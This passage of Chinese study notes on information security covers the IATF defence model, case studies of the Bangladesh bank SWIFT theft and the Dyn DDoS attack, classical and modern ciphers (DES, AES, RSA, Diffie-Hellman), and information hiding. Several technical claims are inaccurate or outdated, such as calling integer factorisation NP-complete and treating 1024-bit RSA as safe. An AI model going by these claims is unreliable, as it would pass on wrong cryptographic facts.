- 分层防御。在重要敏感位置部署多层防御机制，不但能抗攻击，还具有检测能力，使攻击者不得不面对被检测到的风险，迫使攻击者由于高昂的攻击代价而放弃攻击行为。

- 安全强健性。根据信息系统中每个信息遭到破坏后可能会带来的损失或后果，配备相对应的安全组件。


##### (3)IATF的焦点框架区域

在IATF中，将信息系统的信息安全保障技术层面分**为四个焦点领域**：

- 本地的计算环境
  - 服务器
  - 客户端及其上面的应用（如打印服务、目录服务等）
  - 操作系统
  - 数据库
  - 基于主机的监控组件（病毒检测、入侵检测） 
- 区域边界（本地计算环境的外缘）
  - 区域是指在单一安全策略管理下、通过网络连接起来的计算设备的集合
  - 区域边界是区域与外部网络发生信息交换的部分 
  - 区域边界确保进入的信息不会影响区域内资源的安全，而离开的信息是经过合法授权的 
- 网络和基础设施
  -	局域网（LAN）
  -	校园网（CAN）
  -	城域网（MAN）
  -	广域网等
- 支持性基础设施
  - 鉴别
  - 访问控制
  - 机密性
  - 完整性
  - 抗抵赖性
  - 可用性

## 1.6 若干典型的安全事件

### 案例1：互联网上个人隐私荡然无存

2013年，央视315晚会揭秘了一个在业界广为流传的说法：每个网民的一举一动都被别有用心的人所监控，网民的所有秘密都被窃取。

2013年，中情局前雇员斯诺登揭示了美国政府以反恐的名义监视一切他们认为需要监视的人的所有行为。一个错打的电话，一个错误的访问网址，也许就能给你带来无妄之灾。

### 案例2：史上最严重的银行失窃案

由于可以既满足心理虚荣心和获得相应的名声，同时又可以最直接的获得大量金钱，因此金融行业，特别是银行历来是黑客最为青眯的目标之一。

2016年2月5日，孟加拉国中央银行在美国纽约联邦储备银行开设的账户遭黑客攻击，被盗走约1亿美元，引发全球轰动。

有250家中央银行、政府和其他机构在美国纽约联邦储备银行设立海外账户,这些账户通常存有美国国债、政府部门债等，并依靠环球银行金融电信协会（SWIFT,一个国际银行间非盈利的国际合作组织）运营的电文网络相互连接并进行交易。孟加拉国中央银行也是纽联储客户之一，有大约280亿元的美元资产。

2016年2月5日，黑客攻入孟加拉国中央银行网络，窃取了转移支付的安全证书，并在连接SWIFT的打印机中种植了木马，造成打印机故障的假象。因为时值周末，打印机的维修工作被安排至下一周进行。

黑客利用盗取的安全证书通过SWIFT电文对孟加拉央行在纽联储的账户发出了35份约9.51亿美元的转账交易请求。纽联储发现转账巨款流入的是个体账户而非银行机构，随之向孟加拉发出警告。由于打印机故障，这些警告未被及时打印完成。因未接到终止转账的指令，纽联储放行交易继续进行。

当进行到第5个转账操作时，一个有关收款方的拼写错误引起了中转银行——德意志银行的怀疑，黑客把“基金会”的英文“Foundation”被拼成了“Fandation”。后者随即要求孟加拉国央行核实信息，后者察觉账户被盗用后马上中止交易。

至此，已经有1.01亿美元的资金被分别转到了斯里兰卡和菲律宾的账户中。其中，转往斯里兰卡的2000万美元随后被追回，而8100万美元流进了菲律宾的赌场。按照菲律宾的法律，不会审核进入赌场资金的来源与去向。也就是说，8100万美元犹如入海泥牛般消失了，很难继续追踪。

### 案例3：工业控制网络和物联网成为重灾区

**来自智慧设施的攻击**

美国东部时间2016年10月21日早上7点，为大批知名网站提供DNS的Dyn公司被黑客攻陷，DNS服务无法正常进行。导致Twitter、Tumblr、Netflix、亚马逊、HBONow、星巴克、Shopify、Reddit、Airbnb、PayPal和Yelp等超过1200家人气网站无一幸免的无法访问。有报道称周五早上美国东部地区的互联网变成了一座“鬼城”。

10月22日凌晨，从东海岸的波士顿纽约费城华盛顿，到西海岸的洛杉砚旧金山西雅图等重要城市，互联网服务全面断网。在此次攻击中，黑客采用了分布式拒绝服务（DDOS)技术，动员了千万数量级肉鸡（僵尸）发动攻击。高峰时，攻击流量超过1Tb/s。

在参与攻击的肉鸡中，分布在全美各地甚至世界各地的摄像头、智能传感器、智能门磁、智能冰箱等智慧设施（物联又设备）格外引人注目。

# 第2章 加密技术

## 2.1 密码学概述

> 信息安全可以简单的分为主动保护和被动防范。其中，防火墙、病毒查杀、入侵检测等属于被动的安全防范措施；数据加密则是主动的安全保护措施。

### 2.1.1 密码学定义

​	**密码学（Cryptology）**是研究密码系统或保密通信的一门科学，主要包括密码编码学和密码分析学两个部分。其中：

- 密码编码学主要是研究保证消息保密性或认证性的方法。

- 密码分析学主要是研究加密消息的破译或消息的伪造。

密码学具有 **4 个基本功能** ：

1. **保密性**，非授权者无法知道消息的内容。
2. **完整性**，消息的接收者应该能够验证消息在传输过程中没有被改变。
3. **鉴别**，消息的接收者应该能够确认消息的来源。
4. **不可否认性**，发送方不能否认已经发送的消息。

### 2.1.2 密码学的发展历程

### 2.1.3 保密通信模型

> ​	香农以概率统计的观点对消息源、密钥源、接收和截获的消息进行数学描述和分析，用不确定性和唯一解距离来度量密码体制的保密性，阐明了密码系统、完善保密性、纯密码、理论保密性和实际保密性等重要概念，从而大大深化了人们对于保密学的理解。
>
> ​	香农的工作使信息论成为研究密码学和密码分析学的一个重要理论基础，宣告了科学的密码学时代的到来。波士顿环球报将此文誉为“将密码从艺术变成为科学。

![image-20220508105958950](https://img.moxhub.cn/blog/image-20220508105958950.png)

1. #### 几个概念

- **信源**：信息的发出者
- **信宿**：信息的接收者
- **明文(Plaintext)**:加密前或解密后的信息
- **密文(Ciphertext)**:也称密报（Cryptogram)是指加密后的信息
- **加密算法(Encryption Algorithm)**:在一组密钥K作用下，将明文M转变为密文C的一组规则或变换
- **解密算法(Decryption Algorithm)**:在一组密钥K作用下，将密文C转变为明文M的一组规则或变换
- **密钥源**：加密和解密密钥集合
- **密钥(Secret Key)**:将明文转变为密文（或将密文转变为明文）过程中必须拥有的数据。其中，加密时称为加密密钥；解密时称为解密密钥
- **分析者**：从普通信道中窃取密文并试图用非正常方式进行破解以获得与密文对应的明文M'和密钥K'的非授权者

2. #### 加密系统工作原理

1. 信源产生明文M,并将其传送到加密器
2. 在加密密钥K的作用下，加密器按照加密算法将明文M转变为密文C.并将其在普通信道上传输，即C=E(M)
3. 在解密密钥K的作用下，解密器按照解密算法将密文C转变为明文M,并将其传送给信宿，即M=D(C)
4. 一个密码系统（通常称为密码体制）通常由加密（解密）算法、明文、密文和密钥构成，并分别称为明文空间、密文空间和密钥空间

- #### 一个好的密码系统应该满足下列要求

1. 安全性。破译者获得密文后在有效的时间和能承受的成本范围内无法计算
   出加密的密钥或明文。
2. 密钥依赖性。密文的保密性仅依赖于密钥而不是对加密体制或算法的保密，即：“一切秘密寓于密钥之中。”
3. 适用性。加密和解密算法适用于明文空间、密文空间的所有元素。
4. 易用性。加密和解密算法能有效地计算，密码系统易于实现和使用。

### 2.1.4 密码体制分类

​	按密钥的使用数量，密码体制分为**对称密码（Symmetric Cipher,又称单钥密码）和非对称密码（Asymmetric Cipher,又称公钥密码）**。
​	按照对明文的处理方式，对称密码又有**分组密码（Block Cipher)和流密码（Stream Cipher)**之分。

1. #### 对称密钥体制

一般地，对称密钥密码体制中的加密密钥和解密密钥完全相同，彼此之间很容易相互确定，密钥需经过安全通道进行传送，这种密码体制的安全性等价于密钥的安全性。

- **优点**：加密速度快。只要保证密钥安全，就可以保证密码体制安全。
- **缺点**：随着网络规模扩大，密钥管理成为一个难题，无法解决信息确认问题并缺乏自动检测密钥、泄露的能力。

2. #### 公钥密码体制

  在公钥密码体制中，加密密钥和解密密钥不同，不需要专门传送密码的安全通道。

- **优点**：简化了密钥管理的问题，并且拥有数字签名等新功能。
- **缺点**：算法比较复杂，加密、解密速度慢。
3. #### 混合密码体制

  一种将对称密钥密码和公钥密码相结合的密码体制。在这种密码体制中，对保密信息采用对称加密密钥进行加解密，而密钥的传送则采用公钥密码。

- **优点**：解决了密钥管理的难题，又解决了加解密速度慢的问题。
- **缺点**：算法仍然比较复杂，需要管理两套密码体制。

4. #### 密码分析

- 即密文破译，是指在不知道密钥及通信者所采用的加密体制等细节条件下，密码分析者从获取的密文进行分析，试图获取机密信息的过程。

- 研究分析解密规律的科学称作**密码分析学**。一个成功的密码分析不仅能够恢复出明文和密钥，而且能够发现密码体制的弱点，从而控制通信。

> 密码分析在外交、军事、公安、商业等方面都具有重要作用，也是研究历史、考古、古语言学和古乐理论的重要手段之一。密码分析除了依靠数学、工程背景、语言学等知识外，还要靠经验、统计、测试、眼力、直觉判断能力……，有时还靠点运气。

- ##### 密码分析方法

> 密码分析方法主要有三种：

- **穷举攻击法**：通过试遍所有可能的密钥对密文进行破译。只要有足够多的计算能力、时间和存储容量，原则上穷举法总可以成功破译。通过增大密钥量长度即可有效对抗穷举法攻击。任何一种能保证安全要求的实用密码都会使这种方法在当时及可预期的时间内不可行。
- **统计分析法**：利用明文的已知统计规律进行破译的方法。密码破译者对截收的密文进行统计分析，总结出其间的统计规律，并与明文的统计规律进行比较，从中提取出明文和密文之间的对应或变换信息。设法使明文与密文的统计特性不一致即可有效对抗这种方法。
- **解密变换攻击**：利用一些已知量（如已知的密文-明文对等）,通过数学的方式求解未知量（如密钥等）。破译的关键是找到这种数学表达方式。设计基于复杂数学难题的密码编制算法。

- ##### 密码分析类型
>在已知加密算法全部知识的情况下，根据密码分析者对明文、密文等数
据资源的掌握程度，密码分析攻击类型有：

- **惟密文攻击**（Ciphertext-only attack):可利用的资源只有截获的密文和对加密算法的了解。这是最困难的破译方法。能被这种方法破译的密码体制是不安全的密码体制。
- **已知明文攻击**（Plaintext-known attack):除了有截获的密文外，还有一些已知的“明文一密文对”。密码分析者的任务是推算出加密密钥或某种可以对用该密钥加密的任何消息进行解密的算法。
- **选择明文攻击**（Chosen-plaintext attack):不仅拥有一些“明文一密文对”，还可以选择被加密的明文并获得相应的密文。这时密码分析者能够选择特定的明文数据块进行加密，并比较明文和对应的密文，以便分析和发现更多与密钥相关的信息。密码分析者的任务是推算出加密密钥或某种可以对用该密钥加密的任何新的消息进行解密的算法。
- **选择密文攻击**（Chosen-ciphertext attack):可以选择一些密文，并得到相应的明文。密码分析者的任务是推算出密钥。这种密码分析多用于攻击公钥密码体制。

5. #### 密码安全性
> 衡量一个保密系统的安全性有两种基本方法：一种是无条件安全，又称完善保密性；另一种是计算安全性，又称实际保密性。

- **无条件安全（Unconditionally Security)**:
不论提供的密文有多少，密文中所包含的信息都不足以惟一地确定其对应的明文。即使具有无限计算资源（如时间、计算能力、空间、资金和设备等）的密码分析者也无法破译某个密码系统。称这样的密码体制为无条件安全的密码体制。

- **计算安全性（Computational Security)**:
即使利用最好的已知或未知的算法，破译密码系统所需要的计算资源远远超过破译者能够承受的极限。一般情况下，通常指所需要的计算时间远远超过人们能够承受的期限。称这样的密码体制为计算上安全的密码体制。

## 2.2 传统密码技术（不重要）

### 2.2.1 移位密码

![image-20220508153630538](https://img.moxhub.cn/blog/image-20220508153630538.png)

### 2.2.2 仿射密码

![image-20220508153707868](https://img.moxhub.cn/blog/image-20220508153707868.png)

### 2.2.3 代换密码

#### 1. 单表代换

> 密文是26个字母的任意置换，密钥是明文字母到密文字母的一个字母表.这种密码称单表代换密码不能抵抗明文统计特性的攻击

![image-20220508112109073](https://img.moxhub.cn/blog/image-20220508112109073.png)

#### 2. 多表代换密码

>单表代换很容易被破解。
多表代换密码是对每个明文字母采用不同的单表代换。在各种多表代换密码中，由16世纪法国密码专家Vigenenre发明的多表代换密码（维吉尼亚密码）是最为著名的之一。

![image-20220508112048811](https://img.moxhub.cn/blog/image-20220508112048811.png)

- 这里的所有的运算都是在（mod 26)中进行。

  

### 2.2.4 置换密码

> 置换密码是指不改变字母本身，改变字母出现的位置，使得内容无法被理解。

#### 1.栅栏密码

将明文以N个字符为单位分为M组，不足部分以空格补足。把每组对应位置的字符依次连接起来即形成密文。

![image-20220508153842880](https://img.moxhub.cn/blog/image-20220508153842880.png)


#### 2. 有密钥置换

选用一个词语作为密钥，并按照该词语中各不同字母的顺序作为明文字符置换的依据。

![image-20220508153900974](https://img.moxhub.cn/blog/image-20220508153900974.png)

![image-20220508153750395](C:\Users\life_\Desktop\image-20220508153750395-1651995556784.png)


## 2.3 对称密码技术

### 2.3.1 定义

> 对称密码是指加密密码和解密密码可以相互推导的密码体制。在绝大部分情况下，加密密码和解密密码完全相同。
>
> 又称为单密钥加密，密钥加密，常规加密，传统加密。
>
> 根据加密方式，对称密码分为流密码（也称为序列密码）和分组密码两种类型。

#### 1. 流密码

流密码（Stream Cipher)按照位进行加解密，密码序列的长度与被加密消息长度相等。典型算法：RC4。

![image-20220508112630304](https://img.moxhub.cn/blog/image-20220508112630304.png)

- 按照密钥流的产生是否与明文或密文有关，可分为：

  - 同步流密码

  - 自同步流密码

#### 2. 分组密码

分组密码（Block Cipher)则将明文按照一定长度（如64B、128B等）,以组为单位进行加解密，并且不同组采用相同的密钥。

![image-20220508112752857](https://img.moxhub.cn/blog/image-20220508112752857.png)

### 2.3.2 对称密码体制的优缺点

#### 1. 优点

- 计算量小
- 加解密速度快
- 加解密效率高

#### 2. 缺点

- 交易双方使用同样密钥，安全性难以保证
- 密钥数量呈几何级数增长，密钥管理困难
- 不适于分布式网络系统，密钥管理困难，成本高
- 提供加密和认证，但缺乏签名功能，使用范围有所较小

### 2.3.3分组密码

#### 1. 分组密码基本概念

分组密码又称块密码，是将明文M划分为一系列的明文块Mi-,并且对每一块Mi都用同一个密钥K进行加密的密码体制。
例如：FOUR_AND_FOUR分成三块FOUR、_AND_、FOUR

![image-20220508112949840](https://img.moxhub.cn/blog/image-20220508112949840.png)

解密也是按块进行。

![image-20220508122850937](https://img.moxhub.cn/blog/image-20220508122850937.png)

- 块加密技术有重复文本问题，因为相同的块会产生相同的密文块。给密码分析员提供一些模式信息。
- 通常64位以上。

#### 2. 分组密码主要技术

1949年，Shannon提出了能够破坏对密码系统进行各种统计分析攻击的两个基本操作：

- 混淆（confusion)--替换技术
- 扩散（diffusion)一一置换技术（变换技术）

> IBM公司的物理学家Horst Feistel以Shannon的观念为基础，提出了一种交替使用替换与置换技术的对称加密系统结构，即Feistel密码或Feiste网络。

#### 3. 经典分组密码算法

在分组密码体制中，有如下一些基本算法模式：

- 数据加密标准（Data Encryption Standard,DES)

- 高级加密标准（Advanced Encryption Standard,AES)

- 国际数据加密算法（International Data Encryption Algorithm,IDEA)

### 2.3.4 数据加密标准（重点）

#### 1. 数据加密标准基本概念

- 1977年，在IBM的LUCIFER方案基础上，美国国家标准局颁布了世界上第一个现代分组密码算法--数据加密标（Data Encryption StandardDES)。DES是分组长度为64位的分组密码算法，密钥长度也是64位，其中每8位有一个奇偶校验位，因此有效密钥长度为56位。DES算法公开，安全性依赖密钥的保密程度。
- DES具有一种Festel结构，加、解密过程和算法完全相同，有三个参数：Key、Data、Mode。其中Key是密钥，8个字节共64位；Data为待加密(或解密）的数据，以64比特为单位分组；Mode为工作方有两种：加密或解密。
- 如Mode为加密，则用Key对明文数据Data进行加密，生成Data的密文形式（64位）作为输出；如Mode为解密，则用Key对密文数据Data进行解密，还原为Data的明文形式（64位）作为输出。

![image-20220508154828706](https://img.moxhub.cn/blog/image-20220508154828706.png)

#### 2. DES的加密主要过程（重中之重）

DES加密算法可以归纳为**三个关键步骤**：

- 两次初始置换（初始置换和初始逆置换）
- 子密钥控制下的十六轮迭代加密 (也称为乘积变换）

- 十六轮子密钥生成



##### （1）**初始置换（Initial Permutation，IP置换）**

> 64比特明文的初始置换。

##### （2）**逆初始置换（Inverse Initial Permutation）**

> 完成16轮迭代加密后，将得到的64比特准密文再次进行的置换。置换完成后，即得到正式的密文并输出。

##### （3）**16轮迭代加密**

![image-20220508155115133](https://img.moxhub.cn/blog/image-20220508155115133.png)

- 其中某一轮迭代的f函数

![image-20220508155140067](https://img.moxhub.cn/blog/image-20220508155140067.png)

  - **扩展变换（Expansion Permutation，也称为E－盒**）将64位输入序列的右半部分从32位扩展到48位。

![image-20220508155326816](https://img.moxhub.cn/blog/image-20220508155326816.png)

- **S盒替代（S－boxes Substitution）**

>将通过E盒扩展后得到的48比特数据与第i轮子密钥Ki进行异或操作，并将48比特的异或结果以6比特为单位分成8个分组，分别输入到八个S盒进行非线性替换。

![image-20220508155758253](https://img.moxhub.cn/blog/image-20220508155758253.png)

> S盒是DES加密算法中唯一的非线性操作，也是DES具有较高安全性的关键所在。
>
> S盒的构造方法和过程并未正式公布，只有一些非正式泄露的构造S盒的准则。

- **P置换（P Permutation）**

> 将每个S盒的输出组合成一个32位串，再按照下表进行置换：

| 16   | 7    | 20   | 21   | 29   | 12   | 28   | 17   | 1    | 15   | 23   | 26   | 5    | 18   | 31   | 10   |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 2    | 8    | 24   | 14   | 32   | 27   | 3    | 9    | 19   | 13   | 30   | 6    | 22   | 11   | 4    | 25   |

> 将P置换后的二进制串与上一轮产生的左半部32位二进制串进行异或，并将结果作为本轮迭代的右半部分。
>
> 在16轮迭代完成后，将输出的64位二进制串再进行一次逆初始置换，即得到了64位明文相对应的密文。

##### （4）子密钥生成

> 在16轮的迭代中，每一轮都有一个相应的密钥参与其中。这个密钥称为轮密钥，或轮子密钥。子密钥是从用户输入的密钥k中产生。用户确定56位密钥，系统根据56位密钥另外生成8位奇偶校验位，使得密钥共有64位。

![image-20220508160527488](https://img.moxhub.cn/blog/image-20220508160527488.png)

- 置换选择1（Permuted Choice One，PC1）

| 57   | 49   | 41   | 33   | 25   | 17   | 9    | 1    | 58   | 50   | 42   | 34   | 26   | 18   |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 10   | 2    | 59   | 51   | 43   | 35   | 27   | 19   | 11   | 3    | 60   | 52   | 44   | 36   |
| 63   | 55   | 47   | 39   | 31   | 23   | 15   | 7    | 62   | 54   | 46   | 38   | 30   | 22   |
| 14   | 6    | 61   | 53   | 45   | 37   | 29   | 21   | 13   | 5    | 28   | 20   | 12   | 4    |

- 循环左移（circular left shifts ）

![image-20220508160732414](https://img.moxhub.cn/blog/image-20220508160732414.png)

> 左移的位数根据迭代次数而有所不同。

- 压缩置换（Permuted Choice Two，PC2）

| 14   | 17   | 11   | 24   | 1    | 5    | 3    | 28   | 15   | 6    | 21   | 10   |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 23   | 19   | 12   | 4    | 26   | 8    | 16   | 7    | 27   | 20   | 13   | 2    |
| 41   | 52   | 31   | 37   | 47   | 55   | 30   | 40   | 51   | 45   | 33   | 48   |
| 44   | 49   | 39   | 56   | 34   | 53   | 46   | 42   | 50   | 36   | 29   | 32   |

#### 3. DES的解密

> DES的解密算法与加密算法完全一样。只是子密钥的使用顺序相反，即按照K16、K15、…、K1顺序逐轮使用。子密钥算法按照下表循环右移：

![image-20220508160945016](https://img.moxhub.cn/blog/image-20220508160945016.png)

#### 4.DES的安全性

- **安全性不够**
- 1998年7月美国EFF(Electronic Frontier Foundation)宣布，他们以一台价值25万美元的计算机改装成的专用解密机，用56小时破译了56 bits密钥DES。
- **存在弱密钥**
  - 若k1=k2=…=k16,则DESk(m)=DESk-1(m)
- **S-box问题**
  - S盒是不公开的，人们怀疑S盒的构造方法是否有弱点
- **不能抗差分分析**

### 2.3.5 其他对称加密方法

> DES加密方法存在不能应对差分分析攻击，并且应对穷举攻击的能力也随着计算技术的发展而无法满足安全性能要求更高的应用。

#### 1. 3DES

DES安全性能较差与密钥长度只有56位有密切关系。最简单的改进算法安全性的方法是应用不同的密钥对同一个分组消息进行多次加密，由此产生了多重DES加密算法。3重DES加密算法是比较典型的一个方法。

![image-20220508161529075](https://img.moxhub.cn/blog/image-20220508161529075.png)

> 没有针对三重DES的攻击方法，被许多对安全有较高要求的场合，比如PGP、S/MIME、ANS X9.17和ISO 8732等。

#### 2. AES（看一下）

> DES太弱，3DES太慢


1997年，美国国家标准与技术研究院（NIST)面向全世界征集高级加密标准：

- 采用对称分组加密体制，具有可变长度密钥（128、192或256位）,具有128位的分组长度；
- 比3DES快、安全性能至少达到3DES;
- 可应用于公共领域并能够在全世界范围内免费使用；
- 至少在30年内是安全的。

共有来自10个不同国家的研究人员提交了15个AES的候选算法。到2000年10月2日，NIST正式宣布由两位比利时人Daemen和Rijmen提出的Rijndael算法，被选择为高级数据加密标准（AES)算法。

- AES也是一个典型的迭代型分组密码，而且分组长度和密钥长度都可变，分组长度和密钥长度可以独立的指定为128位、192位和256位。
- 现在被采用的AES算法的加密轮数依赖于所选择的子密钥长度。对于选择128位的密钥长度，加密的轮数为10；对于选择192位的密钥长度，加密的轮数为12；对于选择256位的密钥长度，加密的轮数为14。 

![image-20220508161809022](https://img.moxhub.cn/blog/image-20220508161809022.png)

## 2.4 非对称密码技术

### 2.4.1 非对称密码技术基本概念

- 非对称密码技术的发展是整个密码学发展历史中最伟大的一次革命。
- 在非对称密码技术中，有两个完全不一样并且不可相互推导的密码，分别称为公开密钥（简称公钥）和私有密钥（简称私钥）。若用其中一个加密，则必须用另外一个密码才能解密，即所谓的“公钥加密，私钥加密”或“私钥加密，公钥加密”。在消息的保密性、密钥分配和认证领域有重要意义。
- 私钥只能由一方安全保管，不能外泄，公钥则可以发给任何有合法需要的用户。
- 因为可以将一个密钥公开，所以非对称加密技术也称为公开密钥加密技术。相应地，密码体制也称为公钥加密体制。

#### 1. 传统密码中的两个问题

- 密钥分配问题：如果密钥被偷，设计再好的密码体制都没有用
- 数字签名问题：能否设计一种方法确保数字签名出自某个特定的人，并且各方无异议？
- 1976年，Diffie和Hellman在“密码学新方向”一文中首次提出非对称加密体制的思想。
  - 使用两个密钥：公开密钥、私有密钥
  - 加解密的非对称性
  - 利用数论的方法
  - 是对称密码的重要补充

#### 2. 公钥密码体制原理

Diffie 和Hellman提出：利用NP复杂性理论和陷门单向函数

- 单向函数：一个函数f对定义域上任意一个x,f(x)容易计算；但对f值域上的任意y,f-1(y)都在计算上不可行。
- 陷门单向函数：单向函数f(x),如果进一步给定某些辅助信息（如解密密钥）,计算f-1(y)又变得容易。

#### 3. 公钥密码体制的特点

- 产生密钥对作（Pk)在计算上是可行
- 两个密钥中的任何一个都可以用来加密，另一个则用来解密
- 已知公钥与明文，产生密文是容易
- 利用私钥解密密文在计算上是可行
- 利用公钥求解私钥在计算上是不可行
- 利用密码算法和公钥求解私钥在计算上不可行
- 已知公钥与密文，不知私钥时，恢复明文在计算上是不可行
- 用私钥加密，公钥解密，则可获得一个数字签名。在有数字签名的条件下，发送者无法否认是发送的信息，即不可否认性。

#### 4. 可信单向函数举例

> 假设n是两个大素数口和q的乘积，分解n是一个非常困难的问题（NP-完全问题）

![image-20220508162303516](https://img.moxhub.cn/blog/image-20220508162303516.png)

### 2.4.2 RSA公钥密码体制（重点）

- 1978年，R.Rivest,A.Shamir和L.Adleman三人最早实现Diffie和Hellman的想法，提出了RSA算法。
- RSA算法安全：利用陷门单向函数的一种可逆模指数运算，其安全性基于大整数分解因子的困难性。安全，易懂.可用于加密与数字签名.
- ISO,ITU,SWIFT把RSA选为加密标准；Internet的E-Mail的保密系统GPG,国际VISA和MASTER组织的电子商务协议（SET协议）都将RSA作为传送会话密阴和数字签名的标准。

#### 1. RSA密钥生成

![image-20220508162510043](https://img.moxhub.cn/blog/image-20220508162510043.png)

#### ２. 利用RSA 进行加解密

![image-20220508162636002](https://img.moxhub.cn/blog/image-20220508162636002.png)

> 注意：消息M一定要小于模数n。

#### 3. RSA算法简单证明

![image-20220508162708206](https://img.moxhub.cn/blog/image-20220508162708206.png)

> 注意：
>
> - 使用RSA时必须：随机确定两个素数 p,q
>   - 选择e或d,并求出另一个
> - 素数p,q一定不能从n=p.q轻易得到
>   - 意味着素数要足够大
>   - 典型地用猜测或可能性测试
> - 指数e,d互逆

#### 4. RSA安全性

- 安全：采用大的密钥，e和d越大越好，但越大加解密速度越慢，二者之间折中。
- RSA算法的攻击难度在于模数n乘积因子分解的难度。
- 密钥长度大于1024比特时，RSA算法目前依然安全。
- RSA限制条件：素数p和q的差异不应太大，p-1,q-1都应该有大的素数因子，gcd(p-1,q-1)应该偏小。
- RSA并不能防止中间人攻击。事实上，所有的公钥加密方法都无法预防中间人攻击。

#### 5. RSA的优点

既可用于加密，也可用于数字签名，安全性高。RSA密码已成为目前应用最广泛的公开密钥密码。

#### 6. RSA缺点

- 密钥产生复杂，受到素数产生技术的限制，因而难以做到一次一密
- 分组长度太大，为保证安全性，n至少要600位以上，使得运算代价很高，尤其速度较慢；
- 速度较慢，比经典的分组加密算法（如DES)要慢1500倍。
- 通常的做法：先用对称密码算法对大量用户数据进行加密之后用RSA将对称加密算法的密钥进行加密，最后进行对称密钥的传输和交换，即混合加密体制。

### 2.4.3 其他一些著名的公钥密码体制

> 除了RSA外，还有一些比较著名的公钥密码体制，如柄圆曲线密码体制、DSS密码体制等。
> 所有非对称密码体制均建立在数学难题的基础上，主要的**三个难题**分别是：

- 大数因子分解难解性：典型的方法是RSA
- 离散对数难解性：典型的方法如Diffie-Hellman密钥交换算法、EIGamal算法、DSS算法等。
- 植圆曲线离散对数难解性：典型的方法如桐圆曲线密码体制（ECC)。

#### 1. Diffie-Hellman密钥交换算法（了解）

> Diffie-Hellman密钥交换算法的有效性依赖于计算离散对数的难度

![image-20220508210132445](https://img.moxhub.cn/blog/image-20220508210132445.png)

![image-20220508210104440](https://img.moxhub.cn/blog/image-20220508210104440.png)



#### 2. ElGamal密码算法

#### 3. 椭圆曲线密码算法

#### 4. DSA数字签名算法

# 第3章 隐藏技术

## 3.1 信息隐藏概述

### 3.1.1 信息隐藏的基本概念

信息隐藏和密码学是信息安全的两大支柱。其中：

* 密码学研究让信息变得不可读
* 信息隐藏研究让信息变得不可见

随着信息技术的发展，信息隐藏技术也得到了快速发展，应用领域也十分广阔。

#### 1. 信息隐藏的定义

> 信息隐藏是利用数字媒体的冗余性和人类感知的局限性，将一个消息（称为秘密消息）隐藏在另一个消息（遮掩消息或载体消息）中传输，使观察者无法觉察隐蔽消息的存在。

![信息隐藏模型](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/124207.png)

#### 2. 基本要求

* 载体信息正常、普通，不会引起观察者的关注和怀疑
* 无论观察者的感观，还是利用计算机进行分析，都无法区分伪装信息与载体信息
* 对伪装信息进行常规处理（如移位、旋转、压缩等），不应破坏隐藏其中的秘密信息。
* 对伪装对象的正常处理，不应破坏隐藏的信息 

### 3.1.2 信息隐藏分类

![信息隐藏分类](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/124418.png)

#### 1. 隐写术

简单的说，隐写术是一种伪装式的保密通信技术。

* 利用人类感知能力的局限和数字媒体能力的冗余，将秘密信息隐藏于公开信息之中达到保密传输目的。
* 以任何一种媒体作为载体，如图像、视频、音频、文本、数据等形式的媒体均可以被选为载体。
* 被隐藏的信息可以是任何媒体。
* 主要应用于军事、安全等领域。

#### 2. 数字水印

> 数字水印也是一种将一个信息嵌入到另外一个信息中的技术，主要应用于民用领域。通常，被嵌入的信息为一个需要保护的数字作品，如数字音乐等出版物。目的是保护作品拥有者的合法利益。

数字作品的特点：无失真的复制、容易传播、易于修改。因此，数字水印应具备：

* **版权保护**：将版权所有者的信息嵌入到被保护的数字作品中，防止他人宣称对作品的拥有版权。
* **盗版追踪**：在数字作品中不但嵌入版权人的信息，同时也嵌入被授权者（通常是购买者）的信息（数字指纹），一旦发现盗版即可追踪来源。
* **预防复制**：将数字水印与数字作品的使用工具（如音视频播放器）相结合，使得盗版者无法播放盗版作品。

#### 3. 隐蔽通道

> 隐蔽信道也称为潜信道，通常是指一般觉察不到存在的某种通信信道，或者是某种熟视无睹的通信信道，有意者可以利用这种信道传输秘密信息。

隐蔽信道有很多类型，有些是系统设计者的故意行为，有些则是无心之过。

==无心之过==

* 通信协议中，某些未使用的部分或可选项部分都可能成为隐蔽信道。(PPP协议中的保留项目、IP协议中可选项等。)
* 共享资源，收发双方可以通过事先的约定，利用共享资源实现隐蔽通信。(分时系统中对CPU的占有，或共享存储的占用)

==故意行为==

* 特洛伊木马等都可以用来偷偷传输各自信息。

#### 4. 匿名通信

> 匿名通信指采取一定的措施隐蔽通信信息流中的通信关系，使观察者难以获取或分析获知通信双方的关系及内容。匿名通信的目的就是隐蔽通信双方的身份或通信关系，保护网络用户的个人通信隐私。

典型的匿名通信有：**发送者匿名；接收者匿名；通信双方匿名；通信节点匿名；通信代理匿名**

### 3.1.3 信息隐藏系统

#### 1. 无密钥隐藏系统

秘密信息在嵌入到秘密载体之前不做任何加密处理，同时隐藏和提取过程也无密钥参与控制，秘密信息的安全保障完全依赖信息隐藏系统的安全性。嵌入算法和提取算法有嵌入方和提取方约定，算法保密。定义：

对一个五元组$\Sigma =<C，M，C’，D，E>$，

* $C$是所有可能载体的集合，$M$是所有可能秘密消息的集合，$C'$是所有可能伪装对象的集合

* $E:C\times M\rightarrow C'$是嵌入函数

* $D:C'\rightarrow M$是提取函数

若满足性质：

* 对所有$m\in M$和$c\in C$，恒有：$D(E(c，m))=m$，

则称上述五元组为无密钥信息隐藏系统

#### 2. 有密钥隐藏系统

根据加密理论进行秘密信息和嵌入的加密，有密钥的信息隐藏在嵌入和提取时采用相同的密钥，因此也被称为对称信息隐藏技术，反之则被称为非对称信息隐藏技术。隐藏算法可以公开，秘密信息的安全性取决于密钥的安全性。定义：

对一个六元组$\Sigma = <C，M，K，C’，DK，EK>$，

* $C$是所有可能载体的集合，$M$是所有可能秘密消息的集合，$K$是所有可能密钥的集合

* $E_{K_1}:C\times M\times K\rightarrow C’$是嵌入函数，$D_{K_2}:C’\times K\rightarrow M$是提取函数

若满足性质：

* 对所有$m\in M$，$c\in C$和$k\in K$，恒有：$D_{K_2}(E_{K_1} (c, m, k_1), k_2)=m$，

则称该六元组为有密钥信息隐藏系统。

